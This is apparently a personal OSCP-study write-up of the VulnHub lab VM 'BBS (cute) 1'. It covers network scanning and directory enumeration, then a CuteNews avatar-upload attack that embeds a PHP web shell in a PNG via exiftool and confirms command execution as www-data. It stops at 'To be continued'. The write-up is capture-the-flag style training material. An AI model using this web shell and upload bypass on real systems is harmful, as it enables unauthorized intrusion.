---
---
# BBS (CUTE) 1:

Hello, this is one of my writeups, while studying for the OSCP certification. This VM (found [here](https://www.vulnhub.com/entry/bbs-cute-1,567/)) is a nice easy - intermediate level machine.

> I'm not using Kali, or any penTest specific distro. I'm just using my Ubuntu machine. Feel free to use whatever distro you feel comfortable with.


So after you fire up the vm, give it a few minutes to start up all services. Afterwards lets start by scanning the network to identify its IP.
```
netdiscover
```
came up  with the VM's IP : `192.168.1.9`

Lets scan the VM with `nmap -sV` to check what services are exposed.
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-23 07:57 EEST
Nmap scan report for cute.htb (192.168.1.9)
Host is up (0.00071s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
88/tcp  open  http     nginx 1.14.2
110/tcp open  pop3     Courier pop3d
995/tcp open  ssl/pop3 Courier pop3d
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
```
We can see two websites worth checking out first.

The one at port 80 is the default apache landing page, while the one at port 88 returns a `404`. Lets enumerate them both, with `dirb`.
```
$ dirb http://192.168.1.9

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Sep 23 08:02:30 2020
URL_BASE: http://192.168.1.9/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.9/ ----
==> DIRECTORY: http://192.168.1.9/core/                                                                
==> DIRECTORY: http://192.168.1.9/docs/                                                                
+ http://192.168.1.9/favicon.ico (CODE:200|SIZE:1150)                                                  
+ http://192.168.1.9/index.html (CODE:200|SIZE:10701)                                                  
+ hhttp://192.168.1.9/index.php (CODE:200|SIZE:6175)                                                    
==> DIRECTORY: http://192.168.1.9/libs/                                                                
==> DIRECTORY: http://192.168.1.9/manual/                                                              
+ http://192.168.1.9/server-status (CODE:403|SIZE:276)                                                 
==> DIRECTORY: http://192.168.1.9/skins/                                                               
==> DIRECTORY: http://192.168.1.9/uploads/                                                             
                                                                                                       
---- Entering directory: http://192.168.1.9/core/ ----
==> DIRECTORY: http://192.168.1.9/core/captcha/                                                        
==> DIRECTORY: http://192.168.1.9/core/ckeditor/                                                       
==> DIRECTORY: http://192.168.1.9/core/db/                                                             
==> DIRECTORY: http://192.168.1.9/core/includes/                                                       
+ http://192.168.1.9/core/index.html (CODE:200|SIZE:0)                                                 
==> DIRECTORY: http://192.168.1.9/core/lang/                                                           
==> DIRECTORY: http://192.168.1.9/core/modules/                                                        
==> DIRECTORY: http://192.168.1.9/core/tools/                                                          
                                                                                                       
---- Entering directory: http://192.168.1.9/docs/ ----
+ http://192.168.1.9/docs/index.html (CODE:200|SIZE:0)                                                 
                                                                                                       
---- Entering directory: http://192.168.1.9/libs/ ----
==> DIRECTORY: http://192.168.1.9/libs/css/                                                            
==> DIRECTORY: http://192.168.1.9/libs/fonts/                                                          
+ http://192.168.1.9/libs/index.html (CODE:200|SIZE:0)                                                 
==> DIRECTORY: http://192.168.1.9/libs/js/                                                             
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ ----
==> DIRECTORY: http://192.168.1.9/manual/da/                                                           
==> DIRECTORY: http://192.168.1.9/manual/de/                                                           
==> DIRECTORY: http://192.168.1.9/manual/en/                                                           
==> DIRECTORY: http://192.168.1.9/manual/es/                                                           
==> DIRECTORY: http://192.168.1.9/manual/fr/                                                           
==> DIRECTORY: http://192.168.1.9/manual/images/                                                       
+ http://192.168.1.9/manual/index.html (CODE:200|SIZE:626)                                             
==> DIRECTORY: http://192.168.1.9/manual/ja/                                                           
==> DIRECTORY: http://192.168.1.9/manual/ko/                                                           
==> DIRECTORY: http://192.168.1.9/manual/style/                                                        
==> DIRECTORY: http://192.168.1.9/manual/tr/                                                           
==> DIRECTORY: http://192.168.1.9/manual/zh-cn/                                                        
                                                                                                       
---- Entering directory: http://192.168.1.9/skins/ ----
==> DIRECTORY: http://192.168.1.9/skins/base/                                                          
==> DIRECTORY: http://192.168.1.9/skins/emoticons/                                                     
==> DIRECTORY: http://192.168.1.9/skins/images/                                                        
+ http://192.168.1.9/skins/index.html (CODE:200|SIZE:0)                                                
                                                                                                       
---- Entering directory: http://192.168.1.9/uploads/ ----
+ http://192.168.1.9/uploads/index.html (CODE:200|SIZE:0)                                              
                                                                                                       
---- Entering directory: http://192.168.1.9/core/captcha/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/core/ckeditor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/core/db/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/core/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/core/lang/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/core/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/core/tools/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/libs/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/libs/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/libs/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/da/ ----
==> DIRECTORY: http://192.168.1.9/manual/da/developer/                                                 
==> DIRECTORY: http://192.168.1.9/manual/da/faq/                                                       
==> DIRECTORY: http://192.168.1.9/manual/da/howto/                                                     
+ http://192.168.1.9/manual/da/index.html (CODE:200|SIZE:9117)                                         
==> DIRECTORY: http://192.168.1.9/manual/da/misc/                                                      
==> DIRECTORY: http://192.168.1.9/manual/da/mod/                                                       
==> DIRECTORY: http://192.168.1.9/manual/da/programs/                                                  
==> DIRECTORY: http://192.168.1.9/manual/da/ssl/                                                       
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/de/ ----
==> DIRECTORY: http://192.168.1.9/manual/de/developer/                                                 
==> DIRECTORY: http://192.168.1.9/manual/de/faq/                                                       
==> DIRECTORY: http://192.168.1.9/manual/de/howto/                                                     
+ http://192.168.1.9/manual/de/index.html (CODE:200|SIZE:9544)                                         
==> DIRECTORY: http://192.168.1.9/manual/de/misc/                                                      
==> DIRECTORY: http://192.168.1.9/manual/de/mod/                                                       
==> DIRECTORY: http://192.168.1.9/manual/de/programs/                                                  
==> DIRECTORY: http://192.168.1.9/manual/de/ssl/                                                       
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/en/ ----
==> DIRECTORY: http://192.168.1.9/manual/en/developer/                                                 
==> DIRECTORY: http://192.168.1.9/manual/en/faq/                                                       
==> DIRECTORY: http://192.168.1.9/manual/en/howto/                                                     
+ http://192.168.1.9/manual/en/index.html (CODE:200|SIZE:9482)                                         
==> DIRECTORY: http://192.168.1.9/manual/en/misc/                                                      
==> DIRECTORY: http://192.168.1.9/manual/en/mod/                                                       
==> DIRECTORY: http://192.168.1.9/manual/en/programs/                                                  
==> DIRECTORY: http://192.168.1.9/manual/en/ssl/                                                       
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/es/ ----
==> DIRECTORY: http://192.168.1.9/manual/es/developer/                                                 
==> DIRECTORY: http://192.168.1.9/manual/es/faq/                                                       
==> DIRECTORY: http://192.168.1.9/manual/es/howto/                                                     
+ http://192.168.1.9/manual/es/index.html (CODE:200|SIZE:9891)                                         
==> DIRECTORY: http://192.168.1.9/manual/es/misc/                                                      
==> DIRECTORY: http://192.168.1.9/manual/es/mod/                                                       
==> DIRECTORY: http://192.168.1.9/manual/es/programs/                                                  
==> DIRECTORY: http://192.168.1.9/manual/es/ssl/                                                       
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/fr/ ----
==> DIRECTORY: http://192.168.1.9/manual/fr/developer/                                                 
==> DIRECTORY: http://192.168.1.9/manual/fr/faq/                                                       
==> DIRECTORY: http://192.168.1.9/manual/fr/howto/                                                     
+ http://192.168.1.9/manual/fr/index.html (CODE:200|SIZE:9844)                                         
==> DIRECTORY: http://192.168.1.9/manual/fr/misc/                                                      
==> DIRECTORY: http://192.168.1.9/manual/fr/mod/                                                       
==> DIRECTORY: http://192.168.1.9/manual/fr/programs/                                                  
==> DIRECTORY: http://192.168.1.9/manual/fr/ssl/                                                       
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ja/ ----
==> DIRECTORY: http://192.168.1.9/manual/ja/developer/                                                 
==> DIRECTORY: http://192.168.1.9/manual/ja/faq/                                                       
==> DIRECTORY: http://192.168.1.9/manual/ja/howto/                                                     
+ http://192.168.1.9/manual/ja/index.html (CODE:200|SIZE:9935)                                         
==> DIRECTORY: http://192.168.1.9/manual/ja/misc/                                                      
==> DIRECTORY: http://192.168.1.9/manual/ja/mod/                                                       
==> DIRECTORY: http://192.168.1.9/manual/ja/programs/                                                  
==> DIRECTORY: http://192.168.1.9/manual/ja/ssl/                                                       
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ko/ ----
==> DIRECTORY: http://192.168.1.9/manual/ko/developer/                                                 
==> DIRECTORY: http://192.168.1.9/manual/ko/faq/                                                       
==> DIRECTORY: http://192.168.1.9/manual/ko/howto/                                                     
+ http://192.168.1.9/manual/ko/index.html (CODE:200|SIZE:8585)                                         
==> DIRECTORY: http://192.168.1.9/manual/ko/misc/                                                      
==> DIRECTORY: http://192.168.1.9/manual/ko/mod/                                                       
==> DIRECTORY: http://192.168.1.9/manual/ko/programs/                                                  
==> DIRECTORY: http://192.168.1.9/manual/ko/ssl/                                                       
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/tr/ ----
==> DIRECTORY: http://192.168.1.9/manual/tr/developer/                                                 
==> DIRECTORY: http://192.168.1.9/manual/tr/faq/                                                       
==> DIRECTORY: http://192.168.1.9/manual/tr/howto/                                                     
+ http://192.168.1.9/manual/tr/index.html (CODE:200|SIZE:9714)                                         
==> DIRECTORY: http://192.168.1.9/manual/tr/misc/                                                      
==> DIRECTORY: http://192.168.1.9/manual/tr/mod/                                                       
==> DIRECTORY: http://192.168.1.9/manual/tr/programs/                                                  
==> DIRECTORY: http://192.168.1.9/manual/tr/ssl/                                                       
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/zh-cn/ ----
==> DIRECTORY: http://192.168.1.9/manual/zh-cn/developer/                                              
==> DIRECTORY: http://192.168.1.9/manual/zh-cn/faq/                                                    
==> DIRECTORY: http://192.168.1.9/manual/zh-cn/howto/                                                  
+ http://192.168.1.9/manual/zh-cn/index.html (CODE:200|SIZE:9211)                                      
==> DIRECTORY: http://192.168.1.9/manual/zh-cn/misc/                                                   
==> DIRECTORY: http://192.168.1.9/manual/zh-cn/mod/                                                    
==> DIRECTORY: http://192.168.1.9/manual/zh-cn/programs/                                               
==> DIRECTORY: http://192.168.1.9/manual/zh-cn/ssl/                                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/skins/base/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/skins/emoticons/ ----
+ http://192.168.1.9/skins/emoticons/index.html (CODE:200|SIZE:117)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/skins/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/da/developer/ ----
+ http://192.168.1.9/manual/da/developer/index.html (CODE:200|SIZE:6182)                               
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/da/faq/ ----
+ http://192.168.1.9/manual/da/faq/index.html (CODE:200|SIZE:3880)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/da/howto/ ----
+ http://192.168.1.9/manual/da/howto/index.html (CODE:200|SIZE:8865)                                   
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/da/misc/ ----
+ http://192.168.1.9/manual/da/misc/index.html (CODE:200|SIZE:5386)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/da/mod/ ----
+ http://192.168.1.9/manual/da/mod/index.html (CODE:200|SIZE:23354)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/da/programs/ ----
+ http://192.168.1.9/manual/da/programs/index.html (CODE:200|SIZE:6973)                                
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/da/ssl/ ----
+ http://192.168.1.9/manual/da/ssl/index.html (CODE:200|SIZE:5277)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/de/developer/ ----
+ http://192.168.1.9/manual/de/developer/index.html (CODE:200|SIZE:6182)                               
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/de/faq/ ----
+ http://192.168.1.9/manual/de/faq/index.html (CODE:200|SIZE:3880)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/de/howto/ ----
+ http://192.168.1.9/manual/de/howto/index.html (CODE:200|SIZE:8865)                                   
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/de/misc/ ----
+ http://192.168.1.9/manual/de/misc/index.html (CODE:200|SIZE:5386)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/de/mod/ ----
+ http://192.168.1.9/manual/de/mod/index.html (CODE:200|SIZE:23546)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/de/programs/ ----
+ http://192.168.1.9/manual/de/programs/index.html (CODE:200|SIZE:6973)                                
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/de/ssl/ ----
+ http://192.168.1.9/manual/de/ssl/index.html (CODE:200|SIZE:5277)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/en/developer/ ----
+ http://192.168.1.9/manual/en/developer/index.html (CODE:200|SIZE:6182)                               
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/en/faq/ ----
+ http://192.168.1.9/manual/en/faq/index.html (CODE:200|SIZE:3880)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/en/howto/ ----
+ http://192.168.1.9/manual/en/howto/index.html (CODE:200|SIZE:8865)                                   
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/en/misc/ ----
+ http://192.168.1.9/manual/en/misc/index.html (CODE:200|SIZE:5386)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/en/mod/ ----
+ http://192.168.1.9/manual/en/mod/index.html (CODE:200|SIZE:23354)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/en/programs/ ----
+ http://192.168.1.9/manual/en/programs/index.html (CODE:200|SIZE:6973)                                
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/en/ssl/ ----
+ http://192.168.1.9/manual/en/ssl/index.html (CODE:200|SIZE:5277)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/es/developer/ ----
+ http://192.168.1.9/manual/es/developer/index.html (CODE:200|SIZE:6182)                               
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/es/faq/ ----
+ http://192.168.1.9/manual/es/faq/index.html (CODE:200|SIZE:3979)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/es/howto/ ----
+ http://192.168.1.9/manual/es/howto/index.html (CODE:200|SIZE:8279)                                   
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/es/misc/ ----
+ http://192.168.1.9/manual/es/misc/index.html (CODE:200|SIZE:5859)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/es/mod/ ----
+ http://192.168.1.9/manual/es/mod/index.html (CODE:200|SIZE:23733)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/es/programs/ ----
+ http://192.168.1.9/manual/es/programs/index.html (CODE:200|SIZE:7444)                                
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/es/ssl/ ----
+ http://192.168.1.9/manual/es/ssl/index.html (CODE:200|SIZE:5277)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/fr/developer/ ----
+ http://192.168.1.9/manual/fr/developer/index.html (CODE:200|SIZE:6182)                               
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/fr/faq/ ----
+ http://192.168.1.9/manual/fr/faq/index.html (CODE:200|SIZE:3885)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/fr/howto/ ----
+ http://192.168.1.9/manual/fr/howto/index.html (CODE:200|SIZE:9328)                                   
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/fr/misc/ ----
+ http://192.168.1.9/manual/fr/misc/index.html (CODE:200|SIZE:5717)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/fr/mod/ ----
+ http://192.168.1.9/manual/fr/mod/index.html (CODE:200|SIZE:25575)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/fr/programs/ ----
+ http://192.168.1.9/manual/fr/programs/index.html (CODE:200|SIZE:7282)                                
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/fr/ssl/ ----
+ http://192.168.1.9/manual/fr/ssl/index.html (CODE:200|SIZE:5427)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ja/developer/ ----
+ http://192.168.1.9/manual/ja/developer/index.html (CODE:200|SIZE:6182)                               
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ja/faq/ ----
+ http://192.168.1.9/manual/ja/faq/index.html (CODE:200|SIZE:3880)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ja/howto/ ----
+ http://192.168.1.9/manual/ja/howto/index.html (CODE:200|SIZE:8217)                                   
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ja/misc/ ----
+ http://192.168.1.9/manual/ja/misc/index.html (CODE:200|SIZE:5386)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ja/mod/ ----
+ http://192.168.1.9/manual/ja/mod/index.html (CODE:200|SIZE:24656)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ja/programs/ ----
+ http://192.168.1.9/manual/ja/programs/index.html (CODE:200|SIZE:6973)                                
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ja/ssl/ ----
+ http://192.168.1.9/manual/ja/ssl/index.html (CODE:200|SIZE:5497)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ko/developer/ ----
+ http://192.168.1.9/manual/ko/developer/index.html (CODE:200|SIZE:6182)                               
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ko/faq/ ----
+ http://192.168.1.9/manual/ko/faq/index.html (CODE:200|SIZE:3880)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ko/howto/ ----
+ http://192.168.1.9/manual/ko/howto/index.html (CODE:200|SIZE:6661)                                   
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ko/misc/ ----
+ http://192.168.1.9/manual/ko/misc/index.html (CODE:200|SIZE:5483)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ko/mod/ ----
+ http://192.168.1.9/manual/ko/mod/index.html (CODE:200|SIZE:22786)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ko/programs/ ----
+ http://192.168.1.9/manual/ko/programs/index.html (CODE:200|SIZE:5845)                                
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/ko/ssl/ ----
+ http://192.168.1.9/manual/ko/ssl/index.html (CODE:200|SIZE:5277)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/tr/developer/ ----
+ http://192.168.1.9/manual/tr/developer/index.html (CODE:200|SIZE:6182)                               
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/tr/faq/ ----
+ http://192.168.1.9/manual/tr/faq/index.html (CODE:200|SIZE:3887)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/tr/howto/ ----
+ http://192.168.1.9/manual/tr/howto/index.html (CODE:200|SIZE:8865)                                   
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/tr/misc/ ----
+ http://192.168.1.9/manual/tr/misc/index.html (CODE:200|SIZE:5616)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/tr/mod/ ----
+ http://192.168.1.9/manual/tr/mod/index.html (CODE:200|SIZE:23632)                                    
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/tr/programs/ ----
+ http://192.168.1.9/manual/tr/programs/index.html (CODE:200|SIZE:7476)                                
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/tr/ssl/ ----
+ http://192.168.1.9/manual/tr/ssl/index.html (CODE:200|SIZE:5419)                                     
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/zh-cn/developer/ ----
+ http://192.168.1.9/manual/zh-cn/developer/index.html (CODE:200|SIZE:6218)                            
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/zh-cn/faq/ ----
+ http://192.168.1.9/manual/zh-cn/faq/index.html (CODE:200|SIZE:3846)                                  
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/zh-cn/howto/ ----
+ http://192.168.1.9/manual/zh-cn/howto/index.html (CODE:200|SIZE:6845)                                
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/zh-cn/misc/ ----
+ http://192.168.1.9/manual/zh-cn/misc/index.html (CODE:200|SIZE:5084)                                 
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/zh-cn/mod/ ----
+ http://192.168.1.9/manual/zh-cn/mod/index.html (CODE:200|SIZE:23233)                                 
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/zh-cn/programs/ ----
+ http://192.168.1.9/manual/zh-cn/programs/index.html (CODE:200|SIZE:6904)                             
                                                                                                       
---- Entering directory: http://192.168.1.9/manual/zh-cn/ssl/ ----
+ http://192.168.1.9/manual/zh-cn/ssl/index.html (CODE:200|SIZE:5265)                                  
                                                                                                       
-----------------
END_TIME: Wed Sep 23 08:03:19 2020
DOWNLOADED: 368960 - FOUND: 83
```

There's an interesting result here: `http://192.168.1.9/index.php`. It's actually a login page with a register option! Lets create a fake account to get access.

Navigating around the personal options, after we create a fake account, we see that we can upload a custom avatar. (This is also a known vulnerability of cutePHP Cutenews. You can find it [here](https://www.exploit-db.com/exploits/48458)).

Lets create a `php` payload inside a `png` image, upload it and see if we can get a shell to the system.

First download a random png image, then embed the php payload in it with:
```
$ exiftool -v -Comment='<?php echo "<pre>";
system($_GET["cmd"]); ?>' bad.png
======== bad.png
Rewriting bad.png...
  Editing tags in: Comment Ducky ItemList Keys MIE-Doc PNG UserData 
  FileType = PNG
  FileTypeExtension = PNG
  MIMEType = image/png
PNG IHDR (13 bytes):
PNG IDAT (1 chunk, total 61159 bytes)
PNG IEND (end of image)
    1 image files updated
```
rename the created `png` file to a `php` one and upload it through the `Personal Options` page.

test the remote code execution by navigating to:
```
http://192.168.1.9/uploads/avatar_tester_bad.php?cmd=id
```
> Replace tester with your username

We get a response like this:
```
�PNG  IHDR����p4tEXtComment

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
so remote code execution is a go!

## To be continued
